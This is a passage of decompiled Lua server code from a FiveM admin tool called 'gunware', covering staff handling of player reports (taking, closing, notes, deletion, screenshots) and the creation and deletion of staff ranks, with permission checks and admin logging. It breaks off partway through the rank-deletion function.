L83_1(L84_1, L85_1)
L83_1 = L60_1
L84_1 = "gunware:report:take"
function L85_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2
  L2_2 = GetPlayerName
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  L3_2 = L74_1
  L4_2 = A1_2
  L3_2 = L3_2(L4_2)
  if not L3_2 then
    L4_2 = TriggerClientEvent
    L5_2 = "gunware:notif"
    L6_2 = A0_2
    L7_2 = "error"
    L8_2 = "Report introuvable."
    L4_2(L5_2, L6_2, L7_2, L8_2)
    return
  end
  L4_2 = L3_2.status
  if "taken" == L4_2 then
    L4_2 = TriggerClientEvent
    L5_2 = "gunware:notif"
    L6_2 = A0_2
    L7_2 = "error"
    L8_2 = "Ce report est d\195\169j\195\160 pris en charge par "
    L9_2 = L3_2.takenByName
    if not L9_2 then
      L9_2 = "un autre staff"
    end
    L8_2 = L8_2 .. L9_2
    L4_2(L5_2, L6_2, L7_2, L8_2)
    return
  end
  L4_2 = L3_2.status
  if "closed" == L4_2 then
    L4_2 = TriggerClientEvent
    L5_2 = "gunware:notif"
    L6_2 = A0_2
    L7_2 = "error"
    L8_2 = "Ce report a d\195\169j\195\160 \195\169t\195\169 ferm\195\169."
    L4_2(L5_2, L6_2, L7_2, L8_2)
    return
  end
  L4_2 = os
  L4_2 = L4_2.time
  L4_2 = L4_2()
  L5_2 = math
  L5_2 = L5_2.max
  L6_2 = 0
  L7_2 = tonumber
  L8_2 = L3_2.createdAtEpoch
  L7_2 = L7_2(L8_2)
  if not L7_2 then
    L7_2 = L4_2
  end
  L7_2 = L4_2 - L7_2
  L5_2 = L5_2(L6_2, L7_2)
  L3_2.status = "taken"
  L3_2.takenBy = A0_2
  L3_2.takenByName = L2_2
  L6_2 = os
  L6_2 = L6_2.date
  L7_2 = "%Y-%m-%d %H:%M:%S"
  L8_2 = L4_2
  L6_2 = L6_2(L7_2, L8_2)
  L3_2.takenAt = L6_2
  L3_2.takenAtEpoch = L4_2
  L3_2.firstResponseSec = L5_2
  L3_2.waitingSec = L5_2
  L3_2.slaStatus = "handled"
  L3_2.closed = false
  L6_2 = L76_1
  L7_2 = L3_2
  L8_2 = "taken"
  L9_2 = A0_2
  L10_2 = "Report pris en charge"
  L11_2 = {}
  L11_2.waitingSec = L5_2
  L12_2 = L3_2.slaTargetSec
  L11_2.slaTargetSec = L12_2
  L12_2 = L3_2.priorityLevel
  L11_2.priorityLevel = L12_2
  L6_2(L7_2, L8_2, L9_2, L10_2, L11_2)
  L6_2 = L77_1
  L7_2 = L3_2
  L6_2(L7_2)
  L6_2 = TriggerClientEvent
  L7_2 = "gunware:notif"
  L8_2 = A0_2
  L9_2 = "success"
  L10_2 = "Vous avez pris le report en charge."
  L6_2(L7_2, L8_2, L9_2, L10_2)
  L6_2 = L3_2.reporterId
  if L6_2 then
    L6_2 = GetPlayerPing
    L7_2 = L3_2.reporterId
    L6_2 = L6_2(L7_2)
    if L6_2 > 0 then
      L6_2 = TriggerClientEvent
      L7_2 = "gunware:notif"
      L8_2 = L3_2.reporterId
      L9_2 = "info"
      L10_2 = string
      L10_2 = L10_2.format
      L11_2 = "Votre report a \195\169t\195\169 pris en charge par %s"
      L12_2 = L2_2 or L12_2
      if not L2_2 then
        L12_2 = "un staff"
      end
      L10_2, L11_2, L12_2 = L10_2(L11_2, L12_2)
      L6_2(L7_2, L8_2, L9_2, L10_2, L11_2, L12_2)
    end
  end
  L6_2 = logAdminAction
  L7_2 = {}
  L7_2.action = "Report Pris en Charge"
  L7_2.playerName = L2_2
  L8_2 = string
  L8_2 = L8_2.format
  L9_2 = "Report %s pris en charge (de %s) apr\195\168s %ds"
  L10_2 = tostring
  L11_2 = L3_2.id
  L10_2 = L10_2(L11_2)
  L11_2 = L3_2.reporterName
  if not L11_2 then
    L11_2 = "Inconnu"
  end
  L12_2 = L5_2
  L8_2 = L8_2(L9_2, L10_2, L11_2, L12_2)
  L7_2.description = L8_2
  L7_2.color = 65280
  L7_2.webhook = "report_status"
  L6_2(L7_2)
end
L86_1 = "report_take"
L83_1(L84_1, L85_1, L86_1)
L83_1 = L60_1
L84_1 = "gunware:report:close"
function L85_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2
  L3_2 = GetPlayerName
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  L4_2 = L74_1
  L5_2 = A1_2
  L4_2 = L4_2(L5_2)
  L5_2 = tostring
  L6_2 = A2_2 or L6_2
  if not A2_2 then
    L6_2 = "Ferm\195\169 par le staff"
  end
  L5_2 = L5_2(L6_2)
  if "" == L5_2 then
    L5_2 = "Ferm\195\169 par le staff"
  end
  if not L4_2 then
    L6_2 = TriggerClientEvent
    L7_2 = "gunware:notif"
    L8_2 = A0_2
    L9_2 = "error"
    L10_2 = "Report introuvable."
    L6_2(L7_2, L8_2, L9_2, L10_2)
    return
  end
  L6_2 = L4_2.status
  if "closed" == L6_2 then
    L6_2 = TriggerClientEvent
    L7_2 = "gunware:notif"
    L8_2 = A0_2
    L9_2 = "error"
    L10_2 = "Ce report a d\195\169j\195\160 \195\169t\195\169 ferm\195\169."
    L6_2(L7_2, L8_2, L9_2, L10_2)
    return
  end
  L6_2 = os
  L6_2 = L6_2.time
  L6_2 = L6_2()
  L7_2 = math
  L7_2 = L7_2.max
  L8_2 = 0
  L9_2 = tonumber
  L10_2 = L4_2.createdAtEpoch
  L9_2 = L9_2(L10_2)
  if not L9_2 then
    L9_2 = L6_2
  end
  L9_2 = L6_2 - L9_2
  L7_2 = L7_2(L8_2, L9_2)
  L8_2 = tonumber
  L9_2 = L4_2.firstResponseSec
  L8_2 = L8_2(L9_2)
  if not L8_2 then
    L9_2 = L4_2.takenAtEpoch
    if L9_2 then
      L9_2 = math
      L9_2 = L9_2.max
      L10_2 = 0
      L11_2 = L4_2.takenAtEpoch
      L12_2 = L4_2.createdAtEpoch
      L11_2 = L11_2 - L12_2
      L9_2 = L9_2(L10_2, L11_2)
      if L9_2 then
        goto lbl_68
        L8_2 = L9_2 or L8_2
      end
    end
    L8_2 = L7_2
  end
  ::lbl_68::
  L4_2.status = "closed"
  L4_2.closed = true
  L4_2.closedBy = A0_2
  L4_2.closedByName = L3_2
  L9_2 = os
  L9_2 = L9_2.date
  L10_2 = "%Y-%m-%d %H:%M:%S"
  L11_2 = L6_2
  L9_2 = L9_2(L10_2, L11_2)
  L4_2.closedAt = L9_2
  L4_2.closedAtEpoch = L6_2
  L4_2.closeReason = L5_2
  L4_2.resolutionSec = L7_2
  L4_2.firstResponseSec = L8_2
  L4_2.slaStatus = "closed"
  L9_2 = L76_1
  L10_2 = L4_2
  L11_2 = "closed"
  L12_2 = A0_2
  L13_2 = "Report ferm\195\169"
  L14_2 = {}
  L14_2.reason = L5_2
  L14_2.firstResponseSec = L8_2
  L14_2.resolutionSec = L7_2
  L9_2(L10_2, L11_2, L12_2, L13_2, L14_2)
  L9_2 = L77_1
  L10_2 = L4_2
  L9_2(L10_2)
  L9_2 = TriggerClientEvent
  L10_2 = "gunware:notif"
  L11_2 = A0_2
  L12_2 = "success"
  L13_2 = "Report ferm\195\169 avec succ\195\168s."
  L9_2(L10_2, L11_2, L12_2, L13_2)
  L9_2 = L4_2.reporterId
  if L9_2 then
    L9_2 = GetPlayerPing
    L10_2 = L4_2.reporterId
    L9_2 = L9_2(L10_2)
    if L9_2 > 0 then
      L9_2 = TriggerClientEvent
      L10_2 = "gunware:notif"
      L11_2 = L4_2.reporterId
      L12_2 = "info"
      L13_2 = string
      L13_2 = L13_2.format
      L14_2 = "Votre report a \195\169t\195\169 ferm\195\169 par %s"
      L15_2 = L3_2 or L15_2
      if not L3_2 then
        L15_2 = "un staff"
      end
      L13_2, L14_2, L15_2, L16_2, L17_2 = L13_2(L14_2, L15_2)
      L9_2(L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2)
    end
  end
  L9_2 = logAdminAction
  L10_2 = {}
  L10_2.action = "Report Ferm\195\169"
  L10_2.playerName = L3_2
  L11_2 = string
  L11_2 = L11_2.format
  L12_2 = "Report %s ferm\195\169 (de %s) - Raison: %s | R\195\169ponse: %ds | R\195\169solution: %ds"
  L13_2 = tostring
  L14_2 = L4_2.id
  L13_2 = L13_2(L14_2)
  L14_2 = L4_2.reporterName
  if not L14_2 then
    L14_2 = "Inconnu"
  end
  L15_2 = L5_2
  L16_2 = L8_2 or L16_2
  if not L8_2 then
    L16_2 = 0
  end
  L17_2 = L7_2
  L11_2 = L11_2(L12_2, L13_2, L14_2, L15_2, L16_2, L17_2)
  L10_2.description = L11_2
  L10_2.color = 16711680
  L10_2.webhook = "report_status"
  L10_2.reason = L5_2
  L9_2(L10_2)
end
L86_1 = "report_close"
L83_1(L84_1, L85_1, L86_1)
L83_1 = RegisterNetEvent
L84_1 = "gunware:report:getCategories"
L83_1(L84_1)
L83_1 = AddEventHandler
L84_1 = "gunware:report:getCategories"
function L85_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2
  L0_2 = source
  L1_2 = TriggerClientEvent
  L2_2 = "gunware:report:categories"
  L3_2 = L0_2
  L4_2 = L63_1
  L1_2(L2_2, L3_2, L4_2)
end
L83_1(L84_1, L85_1)
L83_1 = RegisterNetEvent
L84_1 = "gunware:report:getList"
L83_1(L84_1)
L83_1 = AddEventHandler
L84_1 = "gunware:report:getList"
function L85_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L0_2 = source
  L1_2 = IsStaff
  L2_2 = L0_2
  L1_2 = L1_2(L2_2)
  if not L1_2 then
    L1_2 = TriggerClientEvent
    L2_2 = "gunware:notif"
    L3_2 = L0_2
    L4_2 = "error"
    L5_2 = "Vous n'avez pas la permission d'acc\195\169der aux reports."
    L1_2(L2_2, L3_2, L4_2, L5_2)
    return
  end
  L1_2 = ipairs
  L2_2 = reportServer
  L1_2, L2_2, L3_2, L4_2 = L1_2(L2_2)
  for L5_2, L6_2 in L1_2, L2_2, L3_2, L4_2 do
    L7_2 = L73_1
    L8_2 = L6_2
    L7_2(L8_2)
    L7_2 = L75_1
    L8_2 = L6_2
    L7_2, L8_2, L9_2 = L7_2(L8_2)
    L6_2.waitingSec = L8_2
    L10_2 = L6_2.status
    L10_2 = L7_2 or L10_2
    if "open" ~= L10_2 or not L7_2 then
      L10_2 = L6_2.status
      if not L10_2 then
        L10_2 = "closed"
      end
    end
    L6_2.slaStatus = L10_2
    L10_2 = L9_2 - L8_2
    L6_2.slaRemainingSec = L10_2
  end
  L1_2 = TriggerClientEvent
  L2_2 = "gunware:report:list"
  L3_2 = L0_2
  L4_2 = reportServer
  L1_2(L2_2, L3_2, L4_2)
end
L83_1(L84_1, L85_1)
L83_1 = L60_1
L84_1 = "gunware:report:addNote"
function L85_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2
  L3_2 = GetPlayerName
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  L4_2 = L74_1
  L5_2 = A1_2
  L4_2 = L4_2(L5_2)
  L5_2 = tostring
  L6_2 = A2_2 or L6_2
  if not A2_2 then
    L6_2 = ""
  end
  L5_2 = L5_2(L6_2)
  L6_2 = L5_2
  L5_2 = L5_2.gsub
  L7_2 = "^%s+"
  L8_2 = ""
  L5_2 = L5_2(L6_2, L7_2, L8_2)
  L6_2 = L5_2
  L5_2 = L5_2.gsub
  L7_2 = "%s+$"
  L8_2 = ""
  L5_2 = L5_2(L6_2, L7_2, L8_2)
  if not L4_2 then
    L6_2 = TriggerClientEvent
    L7_2 = "gunware:notif"
    L8_2 = A0_2
    L9_2 = "error"
    L10_2 = "Report introuvable."
    L6_2(L7_2, L8_2, L9_2, L10_2)
    return
  end
  if "" == L5_2 then
    L6_2 = TriggerClientEvent
    L7_2 = "gunware:notif"
    L8_2 = A0_2
    L9_2 = "error"
    L10_2 = "La note est vide."
    L6_2(L7_2, L8_2, L9_2, L10_2)
    return
  end
  L6_2 = #L5_2
  L7_2 = 200
  if L6_2 > L7_2 then
    L7_2 = L5_2
    L6_2 = L5_2.sub
    L8_2 = 1
    L9_2 = 200
    L6_2 = L6_2(L7_2, L8_2, L9_2)
    L5_2 = L6_2
  end
  L6_2 = L4_2.status
  if "taken" == L6_2 then
    L6_2 = L4_2.takenBy
    if L6_2 ~= A0_2 then
      L6_2 = TriggerClientEvent
      L7_2 = "gunware:notif"
      L8_2 = A0_2
      L9_2 = "error"
      L10_2 = "Vous ne pouvez ajouter des notes qu'aux reports que vous avez pris en charge."
      L6_2(L7_2, L8_2, L9_2, L10_2)
      return
    end
  end
  L6_2 = {}
  L7_2 = uuid
  L7_2 = L7_2()
  L6_2.id = L7_2
  L6_2.text = L5_2
  L6_2.authorId = A0_2
  L6_2.authorName = L3_2
  L7_2 = os
  L7_2 = L7_2.date
  L8_2 = "%Y-%m-%d %H:%M:%S"
  L7_2 = L7_2(L8_2)
  L6_2.timestamp = L7_2
  L7_2 = os
  L7_2 = L7_2.time
  L7_2 = L7_2()
  L6_2.timestampEpoch = L7_2
  L7_2 = table
  L7_2 = L7_2.insert
  L8_2 = L4_2.notes
  L9_2 = L6_2
  L7_2(L8_2, L9_2)
  L7_2 = L76_1
  L8_2 = L4_2
  L9_2 = "note_add"
  L10_2 = A0_2
  L11_2 = "Note ajout\195\169e au ticket"
  L12_2 = {}
  L13_2 = L6_2.id
  L12_2.noteId = L13_2
  L14_2 = L5_2
  L13_2 = L5_2.sub
  L15_2 = 1
  L16_2 = 80
  L13_2 = L13_2(L14_2, L15_2, L16_2)
  L12_2.preview = L13_2
  L7_2(L8_2, L9_2, L10_2, L11_2, L12_2)
  L7_2 = L77_1
  L8_2 = L4_2
  L7_2(L8_2)
  L7_2 = TriggerClientEvent
  L8_2 = "gunware:notif"
  L9_2 = A0_2
  L10_2 = "success"
  L11_2 = "Note ajout\195\169e avec succ\195\168s."
  L7_2(L8_2, L9_2, L10_2, L11_2)
  L7_2 = logAdminAction
  L8_2 = {}
  L8_2.action = "Note ajout\195\169e au Report"
  L8_2.playerName = L3_2
  L9_2 = string
  L9_2 = L9_2.format
  L10_2 = "Note ajout\195\169e au report %s: %s"
  L11_2 = tostring
  L12_2 = L4_2.id
  L11_2 = L11_2(L12_2)
  L12_2 = L5_2
  L9_2 = L9_2(L10_2, L11_2, L12_2)
  L8_2.description = L9_2
  L8_2.color = 16776960
  L8_2.webhook = "report_notes"
  L7_2(L8_2)
end
L86_1 = "report_add_note"
L83_1(L84_1, L85_1, L86_1)
L83_1 = L60_1
L84_1 = "gunware:report:deleteNote"
function L85_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2
  L3_2 = GetPlayerName
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  L4_2 = L74_1
  L5_2 = A1_2
  L4_2 = L4_2(L5_2)
  if not L4_2 then
    L5_2 = TriggerClientEvent
    L6_2 = "gunware:notif"
    L7_2 = A0_2
    L8_2 = "error"
    L9_2 = "Report introuvable."
    L5_2(L6_2, L7_2, L8_2, L9_2)
    return
  end
  L5_2 = L4_2.status
  if "taken" == L5_2 then
    L5_2 = L4_2.takenBy
    if L5_2 ~= A0_2 then
      L5_2 = TriggerClientEvent
      L6_2 = "gunware:notif"
      L7_2 = A0_2
      L8_2 = "error"
      L9_2 = "Vous ne pouvez supprimer des notes que des reports que vous avez pris en charge."
      L5_2(L6_2, L7_2, L8_2, L9_2)
      return
    end
  end
  L5_2 = ipairs
  L6_2 = L4_2.notes
  L5_2, L6_2, L7_2, L8_2 = L5_2(L6_2)
  for L9_2, L10_2 in L5_2, L6_2, L7_2, L8_2 do
    L11_2 = tostring
    L12_2 = L10_2.id
    L11_2 = L11_2(L12_2)
    L12_2 = tostring
    L13_2 = A2_2
    L12_2 = L12_2(L13_2)
    if L11_2 == L12_2 then
      L11_2 = L10_2.authorId
      if L11_2 ~= A0_2 then
        L11_2 = IsMaster
        L12_2 = A0_2
        L11_2 = L11_2(L12_2)
        if not L11_2 then
          L11_2 = TriggerClientEvent
          L12_2 = "gunware:notif"
          L13_2 = A0_2
          L14_2 = "error"
          L15_2 = "Vous ne pouvez supprimer que vos propres notes."
          L11_2(L12_2, L13_2, L14_2, L15_2)
          return
        end
      end
      L11_2 = table
      L11_2 = L11_2.remove
      L12_2 = L4_2.notes
      L13_2 = L9_2
      L11_2(L12_2, L13_2)
      L11_2 = L76_1
      L12_2 = L4_2
      L13_2 = "note_delete"
      L14_2 = A0_2
      L15_2 = "Note supprim\195\169e du ticket"
      L16_2 = {}
      L17_2 = tostring
      L18_2 = A2_2
      L17_2 = L17_2(L18_2)
      L16_2.noteId = L17_2
      L17_2 = L10_2.authorName
      L16_2.deletedAuthor = L17_2
      L11_2(L12_2, L13_2, L14_2, L15_2, L16_2)
      L11_2 = L77_1
      L12_2 = L4_2
      L11_2(L12_2)
      L11_2 = TriggerClientEvent
      L12_2 = "gunware:notif"
      L13_2 = A0_2
      L14_2 = "success"
      L15_2 = "Note supprim\195\169e avec succ\195\168s."
      L11_2(L12_2, L13_2, L14_2, L15_2)
      L11_2 = logAdminAction
      L12_2 = {}
      L12_2.action = "Note supprim\195\169e du Report"
      L12_2.playerName = L3_2
      L13_2 = string
      L13_2 = L13_2.format
      L14_2 = "Note supprim\195\169e du report %s"
      L15_2 = tostring
      L16_2 = L4_2.id
      L15_2, L16_2, L17_2, L18_2 = L15_2(L16_2)
      L13_2 = L13_2(L14_2, L15_2, L16_2, L17_2, L18_2)
      L12_2.description = L13_2
      L12_2.color = 16711680
      L12_2.webhook = "report_notes"
      L11_2(L12_2)
      return
    end
  end
  L5_2 = TriggerClientEvent
  L6_2 = "gunware:notif"
  L7_2 = A0_2
  L8_2 = "error"
  L9_2 = "Note introuvable."
  L5_2(L6_2, L7_2, L8_2, L9_2)
end
L86_1 = "report_delete_note"
L83_1(L84_1, L85_1, L86_1)
L83_1 = L60_1
L84_1 = "gunware:report:delete"
function L85_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2
  L2_2 = GetPlayerName
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  if not A1_2 then
    L3_2 = TriggerClientEvent
    L4_2 = "gunware:notif"
    L5_2 = A0_2
    L6_2 = "error"
    L7_2 = "ID de report invalide."
    L3_2(L4_2, L5_2, L6_2, L7_2)
    return
  end
  L3_2 = tostring
  L4_2 = A1_2
  L3_2 = L3_2(L4_2)
  L4_2 = ipairs
  L5_2 = reportServer
  L4_2, L5_2, L6_2, L7_2 = L4_2(L5_2)
  for L8_2, L9_2 in L4_2, L5_2, L6_2, L7_2 do
    L10_2 = L73_1
    L11_2 = L9_2
    L10_2(L11_2)
    L10_2 = tostring
    L11_2 = L9_2.id
    L10_2 = L10_2(L11_2)
    if L10_2 == L3_2 then
      L10_2 = L9_2.status
      if "closed" ~= L10_2 then
        L10_2 = TriggerClientEvent
        L11_2 = "gunware:notif"
        L12_2 = A0_2
        L13_2 = "error"
        L14_2 = "Seuls les reports ferm\195\169s peuvent \195\170tre supprim\195\169s d\195\169finitivement."
        L10_2(L11_2, L12_2, L13_2, L14_2)
        return
      end
      L10_2 = table
      L10_2 = L10_2.remove
      L11_2 = reportServer
      L12_2 = L8_2
      L10_2(L11_2, L12_2)
      L10_2 = GetOnlineStaff
      L10_2 = L10_2()
      L11_2 = ipairs
      L12_2 = L10_2
      L11_2, L12_2, L13_2, L14_2 = L11_2(L12_2)
      for L15_2, L16_2 in L11_2, L12_2, L13_2, L14_2 do
        L17_2 = TriggerClientEvent
        L18_2 = "gunware:report:deleted"
        L19_2 = L16_2
        L20_2 = L3_2
        L17_2(L18_2, L19_2, L20_2)
      end
      L11_2 = TriggerClientEvent
      L12_2 = "gunware:notif"
      L13_2 = A0_2
      L14_2 = "success"
      L15_2 = "Report supprim\195\169 d\195\169finitivement."
      L11_2(L12_2, L13_2, L14_2, L15_2)
      L11_2 = logAdminAction
      L12_2 = {}
      L12_2.action = "Report Supprim\195\169"
      L12_2.playerName = L2_2
      L13_2 = string
      L13_2 = L13_2.format
      L14_2 = "Report %s supprim\195\169 d\195\169finitivement (de %s)"
      L15_2 = L3_2
      L16_2 = L9_2.reporterName
      if not L16_2 then
        L16_2 = "Inconnu"
      end
      L13_2 = L13_2(L14_2, L15_2, L16_2)
      L12_2.description = L13_2
      L12_2.color = 16711680
      L12_2.webhook = "report_delete"
      L11_2(L12_2)
      return
    end
  end
  L4_2 = TriggerClientEvent
  L5_2 = "gunware:notif"
  L6_2 = A0_2
  L7_2 = "error"
  L8_2 = "Report introuvable."
  L4_2(L5_2, L6_2, L7_2, L8_2)
end
L86_1 = "report_delete"
L83_1(L84_1, L85_1, L86_1)
L83_1 = L60_1
L84_1 = "gunware:report:logAction"
function L85_1(A0_2, A1_2, A2_2, A3_2)
  local L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2
  L4_2 = L74_1
  L5_2 = A1_2
  L4_2 = L4_2(L5_2)
  if not L4_2 then
    return
  end
  L5_2 = tostring
  L6_2 = A2_2 or L6_2
  if not A2_2 then
    L6_2 = ""
  end
  L5_2 = L5_2(L6_2)
  if "" == L5_2 then
    return
  end
  L6_2 = L82_1
  L7_2 = L5_2
  L8_2 = A3_2
  L6_2 = L6_2(L7_2, L8_2)
  L7_2 = L81_1
  L8_2 = A3_2
  L7_2 = L7_2(L8_2)
  L7_2.actionKey = L5_2
  L8_2 = L76_1
  L9_2 = L4_2
  L10_2 = "action"
  L11_2 = A0_2
  L12_2 = L6_2
  L13_2 = L7_2
  L8_2(L9_2, L10_2, L11_2, L12_2, L13_2)
  L8_2 = L77_1
  L9_2 = L4_2
  L8_2(L9_2)
end
function L86_1(A0_2)
  local L1_2, L2_2
  L1_2 = IsStaff
  L2_2 = A0_2
  return L1_2(L2_2)
end
L83_1(L84_1, L85_1, L86_1)
L83_1 = RegisterNetEvent
L84_1 = "gunware:report:attachScreenshot"
L83_1(L84_1)
L83_1 = AddEventHandler
L84_1 = "gunware:report:attachScreenshot"
function L85_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L2_2 = source
  L3_2 = L74_1
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  if not L3_2 then
    return
  end
  L4_2 = L3_2.reporterId
  if L2_2 ~= L4_2 then
    L4_2 = IsStaff
    L5_2 = L2_2
    L4_2 = L4_2(L5_2)
    if not L4_2 then
      return
    end
  end
  L4_2 = type
  L5_2 = A1_2
  L4_2 = L4_2(L5_2)
  if "string" ~= L4_2 or "" == A1_2 then
    return
  end
  L3_2.screenshotUrl = A1_2
  L4_2 = L3_2.media
  if not L4_2 then
    L4_2 = {}
  end
  L3_2.media = L4_2
  L4_2 = L3_2.media
  L4_2.screenshotUrl = A1_2
  L4_2 = L3_2.media
  L5_2 = os
  L5_2 = L5_2.date
  L6_2 = "%Y-%m-%d %H:%M:%S"
  L5_2 = L5_2(L6_2)
  L4_2.screenshotCapturedAt = L5_2
  L4_2 = L3_2.media
  L4_2.screenshotCapturedBy = L2_2
  L4_2 = L76_1
  L5_2 = L3_2
  L6_2 = "screenshot"
  L7_2 = L2_2
  L8_2 = "Screenshot du report ajout\195\169"
  L9_2 = {}
  L9_2.url = A1_2
  L4_2(L5_2, L6_2, L7_2, L8_2, L9_2)
  L4_2 = L77_1
  L5_2 = L3_2
  L4_2(L5_2)
end
L83_1(L84_1, L85_1)
L83_1 = RegisterNetEvent
L84_1 = "gunware:report:screenshotFailed"
L83_1(L84_1)
L83_1 = AddEventHandler
L84_1 = "gunware:report:screenshotFailed"
function L85_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2
  L2_2 = source
  L3_2 = L74_1
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  if not L3_2 then
    return
  end
  L4_2 = L3_2.reporterId
  if L2_2 ~= L4_2 then
    L4_2 = IsStaff
    L5_2 = L2_2
    L4_2 = L4_2(L5_2)
    if not L4_2 then
      return
    end
  end
  L4_2 = L76_1
  L5_2 = L3_2
  L6_2 = "screenshot_error"
  L7_2 = L2_2
  L8_2 = "Capture screenshot indisponible"
  L9_2 = {}
  L10_2 = tostring
  L11_2 = A1_2 or L11_2
  if not A1_2 then
    L11_2 = "unknown"
  end
  L10_2 = L10_2(L11_2)
  L9_2.reason = L10_2
  L4_2(L5_2, L6_2, L7_2, L8_2, L9_2)
  L4_2 = L77_1
  L5_2 = L3_2
  L4_2(L5_2)
end
L83_1(L84_1, L85_1)
L83_1 = L60_1
L84_1 = "gunware:sync:createRank"
function L85_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2
  L2_2 = L28_1
  L3_2 = A1_2.permissions
  if not L3_2 then
    L3_2 = {}
  end
  L2_2 = L2_2(L3_2)
  A1_2.permissions = L2_2
  L2_2 = ranksExist
  L3_2 = A1_2.rankName
  L2_2 = L2_2(L3_2)
  if L2_2 then
    L2_2 = TriggerClientEvent
    L3_2 = "gunware:notif"
    L4_2 = A0_2
    L5_2 = "error"
    L6_2 = "This rank already exists."
    L2_2(L3_2, L4_2, L5_2, L6_2)
    return
  end
  L2_2 = ranksServer
  L3_2 = A1_2.rankName
  L4_2 = {}
  L5_2 = A1_2.rankName
  L4_2.label = L5_2
  L5_2 = A1_2.permissions
  L4_2.permissions = L5_2
  L5_2 = A1_2.rankColor
  L4_2.rankColor = L5_2
  L5_2 = A1_2.gamerTagColor
  if not L5_2 then
    L5_2 = 208
  end
  L4_2.gamerTagColor = L5_2
  L5_2 = {}
  L4_2.players = L5_2
  L2_2[L3_2] = L4_2
  L2_2 = saveRanks
  L2_2()
  L2_2 = TriggerClientEvent
  L3_2 = "gunware:notif"
  L4_2 = A0_2
  L5_2 = "success"
  L6_2 = "Rank created successfully."
  L2_2(L3_2, L4_2, L5_2, L6_2)
  L2_2 = logAdminAction
  L3_2 = {}
  L3_2.action = "Create Rank"
  L4_2 = GetPlayerName
  L5_2 = A0_2
  L4_2 = L4_2(L5_2)
  L3_2.playerName = L4_2
  L4_2 = "Created new rank: "
  L5_2 = A1_2.rankName
  L4_2 = L4_2 .. L5_2
  L3_2.description = L4_2
  L3_2.webhook = "rank_management"
  L2_2(L3_2)
end
function L86_1(A0_2)
  local L1_2, L2_2, L3_2
  L1_2 = L29_1
  L2_2 = A0_2
  L3_2 = "rank_manage"
  return L1_2(L2_2, L3_2)
end
L83_1(L84_1, L85_1, L86_1)
L83_1 = _ENV
L84_1 = "getranks"
function L85_1()
  local L0_2, L1_2
  L0_2 = ranksServer
  return L0_2
end
L83_1[L84_1] = L85_1
L83_1 = L60_1
L84_1 = "gunware:sync:deleteRank"
function L85_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2
  L2_2 = ranksExist
  L3_2 = A1_2
  L2_2 = L2_2(L3_2)
  if not L2_2 then
    L2_2 = TriggerClientEvent
    L3_2 = "gunware:notif"
    L4_2 = A0_2
    L5_2 = "error"
    L6_2 = "This rank does not exist."
    L2_2(L3_2, L4_2, L5_2, L6_2)
    L2_2 = logAdminAction
    L3_2 = {}
    L3_2.action = "Delete Rank - Erreur"
    L4_2 = GetPlayerName
    L5_2 = A0_2
    L4_2 = L4_2(L5_2)
    L3_2.playerName = L4_2
    L3_2.source = A0_2
    L4_2 = string
    L4_2 = L4_2.format
    L5_2 = "Tentative de suppression d'un rank inexistant: %s"
    L6_2 = A1_2
    L4_2 = L4_2(L5_2, L6_2)
    L3_2.description = L4_2
    L3_2.webhook = "warning_action"
    L3_2.color = 16776960
    L2_2(L3_2)
    return
  end
  L2_2 = ranksServer
  L2_2 = L2_2[A1_2]
  if L2_2 then
    L3_2 = L2_2.label
    if L3_2 then
      goto lbl_39
    end
  end
  L3_2 = A1_2
  ::lbl_39::
  if L2_2 then
    L4_2 = L2_2.players
    if L4_2 then
      L4_2 = count_table
      L5_2 = L2_2.players
      L4_2 = L4_2(L5_2)
      if L4_2 then
        goto lbl_50
      end
    end
  end
  L4_2 = 0
  ::lbl_50::
  L5_2 = ranksServer
  L5_2[A1_2] = nil
  L5_2 = saveRanks
  L5_2()
  L5_2 = TriggerClientEvent
  L6_2 = "gunware:notif"
  L7_2 = A0_2
  L8_2 = "success"
  L9_2 = "Rank deleted successfully."
  L5_2(L6_2, L7_2, L8_2, L9_2)
  L5_2 = logAdminAction
  L6_2 = {}
  L6_2.action = "Delete Rank"
  L7_2 = GetPlayerName
  L8_2 = A0_2
  L7_2 = L7_2(L8_2)
  L6_2.playerName = L7_2
  L6_2.source = A0_2
  L7_2 = string
  L7_2 = L7_2.format
  L8_2 = "Suppression du rank '%s' (ID: %s)"
  L9_2 = L3_2
  L10_2 = A1_2
  L7_2 = L7_2(L8_2, L9_2, L10_2)
  L6_2.description = L7_2
  L6_2.webhook = "rank_delete"
  L6_2.item = L3_2
  L6_2.amount = L4_2
  L6_2.color = 16711680
  L7_2 = {}
  L8_2 = {}
  L8_2.name = "\240\159\145\164 Admin"
